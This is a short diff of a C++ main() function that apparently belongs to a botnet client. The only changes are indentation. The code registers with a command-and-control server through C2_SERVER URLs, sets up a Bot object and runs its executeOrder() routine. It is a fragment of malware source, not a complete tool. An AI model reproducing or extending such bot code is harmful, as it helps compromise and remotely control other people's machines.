@@ -6,14 +6,14 @@
 #include "aura.hh"
 
 int main() {
-	std::string registerUrl, cmdUrl, seedPath;
+    std::string registerUrl, cmdUrl, seedPath;
 
-	registerUrl = C2_SERVER + REGISTER_URI;
-	cmdUrl = C2_SERVER + CMD_URI;
-	seedPath = util::getInstallDir() + SEED_FILE;
+    registerUrl = C2_SERVER + REGISTER_URI;
+    cmdUrl = C2_SERVER + CMD_URI;
+    seedPath = util::getInstallDir() + SEED_FILE;
 
-	C2Server server(registerUrl, cmdUrl);
-	Bot host(seedPath, &server);
+    C2Server server(registerUrl, cmdUrl);
+    Bot host(seedPath, &server);
 
     if (host.isInit()) {
         host.executeOrder();
